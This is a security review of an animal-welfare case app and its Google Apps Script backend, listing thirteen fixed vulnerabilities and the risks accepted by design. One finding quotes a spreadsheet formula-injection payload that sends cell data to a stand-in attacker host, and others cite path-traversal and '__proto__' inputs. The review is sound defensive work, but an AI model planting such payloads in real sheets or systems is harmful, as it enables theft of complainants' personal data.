# Security Review — Animal Welfare V1

Reviewed 2026-10-26. Covers the Expo app, the Apps Script backend, the Sheets/Drive data store,
and the backup/restore path.

This document records **what was found, what was fixed, and what is accepted risk**. Anything in
"Accepted risk" is a deliberate V1 limitation, not an oversight.

---

## Threat model in one paragraph

The app has no user accounts. Everyone who has the deployed `/exec` URL and the shared secret can
read and write every case, including complainant names and phone numbers. The backend is therefore
protected by exactly one bearer credential, stored in Script Properties on the Google side and in
the device keychain on the phone. The realistic attackers are:

1. Someone who obtains the secret (screenshot, chat message, extracted app bundle, lost phone).
2. Someone who can write data into the app (a rescuer entering a case) and then reads the shared
   Google Sheet, which may be opened by an admin in a browser.
3. A crafted backup or media file handed to a user.

---

## Fixed in this review

### 1. Spreadsheet formula injection (high)

**Before:** every synced string was written straight into a cell with `setValues`. Google Sheets
evaluates a cell starting with `=`, `+`, `-`, or `@` as a formula. A case description such as
`=IMPORTXML("https://attacker.example/?d="&A1,"//x")` would run when an admin opened the Sheet and
could export neighbouring cells to an external server. This is the classic CSV-injection class,
and the shared Sheet is the whole point of the backend, so it was reachable by anyone who could
file a case.

**Now:** `writeCell_()` prefixes any value beginning with `= + - @`, tab, or carriage return with
an apostrophe, which Sheets stores as literal text. `readCell_()` strips that apostrophe on the
way back out, so the app sees exactly what the user typed and values round-trip unchanged.
Numbers and booleans are written as native types and are unaffected.

### 2. Timing-unsafe secret comparison (medium)

**Before:** `provided !== secret_()`. String comparison stops at the first differing character, so
response time leaks how many leading characters a guess got right.

**Now:** `safeEqual_()` compares the full length of both strings without early exit. The secret is
also required to be at least **16 characters**; a shorter one is rejected with a log entry rather
than silently accepted.

### 3. Query-string secrets (medium)

**Before:** `doPost` accepted the secret from `e.parameter.secret`, i.e. from the URL query string.
URLs are recorded in Google's request logs, proxies, and crash reports.

**Now:** only the JSON body is read. The app has always sent the secret in the body, so no client
change was needed.

### 4. Unvalidated Drive uploads (high)

**Before:** `uploadMedia_` used `body.caseId`, `body.category`, `body.fileName`, and `body.mimeType`
verbatim as Drive folder and file names, and base64-decoded an unbounded payload.

**Now:**

| Field | Rule |
|---|---|
| `caseId` | must match `^[A-Za-z0-9_-]{1,32}$` |
| `category` | must be `Photos`, `Evidence`, or `Documents`; anything else falls back to `Documents` |
| `fileName` | control characters and `/` `\` stripped, capped at 120 characters, extension preserved |
| `mimeType` | must be one of the seven types the app can produce |
| `base64` | must be base64 characters only, and decodes to at most 25 MB **checked before decoding** |

Drive folder names can no longer be steered by case text, and a single request cannot allocate an
arbitrary amount of memory.

### 5. Duplicate case numbers from concurrent allocation (high, data integrity)

**Before:** `allocateBlock_` read `nextCaseId`, computed a block, and wrote it back with no lock.
Two devices asking at the same moment received the **same block**, minted the same case IDs, and
silently overwrote each other's rows in `Cases`.

**Now:** the whole read-modify-write runs inside `LockService.getScriptLock()`, and block sizes are
clamped to 1–500.

### 6. Prototype pollution in sheet lookups (medium)

**Before:** `SHEETS[sheetName]`, `PRIMARY_KEYS[sheetName]`, and `rowByKey[key]` were plain object
lookups. `SHEETS['__proto__']` and `SHEETS['constructor']` are truthy, and a row whose primary key
was `__proto__` corrupted the lookup table.

**Now:** lookups go through `has_()` / `headersFor_()` with `Object.prototype.hasOwnProperty`, and
the row index uses `Object.create(null)`. Rows are also copied column-by-column into a
null-prototype object, so an own `__proto__` key cannot reach the write path.

### 7. Endpoint pinning on the device (high, credential phishing)

**Before:** the Shared backend screen accepted any `https://` URL. The shared secret is a bearer
credential, so a message saying "update your backend URL to this" would have mailed the secret and
thereafter the full case history to a third party.

**Now:** `validateBackendCredentials` requires `https:`, host exactly `script.google.com`, no
embedded username/password, and a path ending in `/exec`. The secret must be at least 16
characters, matching the server rule.

### 8. Unbounded backup restore (medium)

**Before:** `pickRestoreFile` called `unzipSync` on whatever the user chose and then trusted the
JSON. A zip bomb could exhaust memory; a crafted backup could insert records with a `caseId` such
as `../../settings`.

**Now:**

- The archive is limited to 64 MB compressed and 32 MB of `data.json`.
- `unzipSync` uses a filter that **only decompresses `data.json`**, and only when its declared
  uncompressed size is within budget, so other entries are never expanded.
- Every record must be an object with a non-empty string id, no control characters, no `/` or `\`,
  and at most 20 000 records per sheet.
- The JSON path is size-checked before parsing.

### 9. Case id used as a filesystem path (medium)

**Before:** `attachDraftMedia` built `${documentDirectory}media/${caseId}/`. A case id can arrive
from a synced sheet row or a restored backup, so `../../settings` would have written media outside
the app's media folder.

**Now:** the id is reduced to `[A-Za-z0-9_-]` and capped at 64 characters before it is used as a
path segment.

### 10. Phone numbers passed to `tel:` unfiltered (low)

**Before:** `callPhone` passed the stored phone string straight into `tel:`. Free-text values could
inject DTMF pauses/waits or extra URI components.

**Now:** `sanitizeDialNumber` keeps an optional leading `+` and digits only, capped at 16
characters, and skips the call when nothing dialable remains.

### 11. Keychain backups carried the secret (low)

**Before:** SecureStore used the default keychain accessibility class, so the shared secret could
be included in an encrypted iCloud/iTunes backup and restored onto a different device.

**Now:** entries are written with `WHEN_UNLOCKED_THIS_DEVICE_ONLY`. Android ignores the option and
already binds entries to the device keystore.

### 12. Error messages leaked configuration state (low)

**Before:** `doPost` returned the raw exception text, and the auth path distinguished "secret not
set" from "secret too short" from "wrong secret".

**Now:** callers always receive `Unauthorized`, `Bad request`, or `Request failed`. The specific
reason and stack trace go to the owner's Apps Script execution log only. Malformed JSON no longer
produces a parser message, and requests over 40 MB are rejected before parsing.

### 13. No limit on rows per push (low)

**Now:** a single `push` is capped at 500 rows, so one request cannot rewrite an arbitrary share of
a sheet while holding the script lock.

---

## Accepted risk (V1, by design)

| Risk | Why it is accepted | Mitigation available today |
|---|---|---|
| The shared secret is a single bearer credential — no per-user identity or access control | The product is a small trusted group of activists; accounts were explicitly out of scope | Rotate `APP_SHARED_SECRET` in Script Properties and on every device |
| The secret ships in the app bundle and can be extracted from a rooted/decompiled build | Any client-side secret is extractable; the alternative is a real auth server | Keep the secret out of git, rotate on loss, restrict who installs builds |
| The `/exec` endpoint is publicly reachable | Apps Script cannot present a Google login to a non-OAuth client | Security rests entirely on the secret plus the 16-character minimum |
| The Sheet and Drive folder contain complainant PII in clear text | The Sheet is the human-readable audit trail the product needs | Keep both private; share only with named admins |
| Anyone with the secret can read all cases | Same as the first row | Rotate the secret when someone leaves |
| Network traffic is not certificate-pinned | `fetch` on Hermes uses the platform TLS stack and the endpoint is pinned to `script.google.com` | Platform trust store |
| SQLite is unencrypted at rest | Device full-disk encryption is the platform baseline | OS-level device encryption and screen lock |
| `localUri` (the device sandbox path of a photo) is synced in the `Documents` sheet | Low sensitivity — no credentials, and the file is not reachable from another device | None needed |
| On web, the secret is kept in `AsyncStorage` (plain `localStorage`) instead of the keychain | Web is not a shipped target; the export exists for development | Do not connect a real backend from a web build |
| No rate limiting beyond Google's quotas | Apps Script has no trustworthy per-caller identity to key a limiter on | Quotas, plus the 500-row and 25 MB request caps |
| Drive files are uploaded as private but readable by the deploying account | Someone must be able to administer the files | Account security (2FA) on the deploying Google account |

---

## Operational requirements

These are not code changes, but the patches above assume them:

1. **Redeploy `Code.gs`** as a **new version** (Deploy → Manage deployments → pencil → New
   version). Existing deployments keep running the old code until you do.
2. **Re-enter the secret** on every device if your current `APP_SHARED_SECRET` is shorter than 16
   characters — it is now rejected.
3. **Turn on 2-Step Verification** for the Google account that deploys the script. It can read
   every case and every uploaded file.
4. **Keep the Sheet and Drive folder private.** Share only with named admins.
5. **Never commit `.env`.** It is gitignored; use `.env.local` for build-time defaults.
6. **Never commit build output** (`dist/`, `dist-web/`). `EXPO_PUBLIC_*` values are inlined into
   the bundle at build time, so a bundle built with `EXPO_PUBLIC_SHEETS_SECRET` contains the
   secret in plain text. Both directories are gitignored.
7. **Rotate the secret** if a device is lost, a screenshot leaks, or someone leaves the group.
8. **Prefer in-app setup over `EXPO_PUBLIC_SHEETS_SECRET`.** A runtime secret entered in
   Settings → Shared backend lives only in the device keychain and never enters a build artifact.

---

## What is still not defended against

- A malicious member of the group who has the secret — they can alter or delete records. History
  rows record who changed what by display name, which is a deterrent, not a control.
- Traffic analysis by the device's network operator.
- A compromised Google account, or a compromised phone with an unlocked screen.
- Supply-chain compromise of an npm dependency.
- Denial of service by someone holding the secret (bounded by Google quotas and the request caps).

---

## Verification performed

- `npx tsc --noEmit` — clean.
- `npx jest --runInBand` — 10 suites, 41 tests passing (added endpoint-pinning, secret-length, and
  dial-sanitisation cases).
- `node --check` on the Apps Script source — clean.
- Manual review of the sync, upload, backup, and sharing paths.
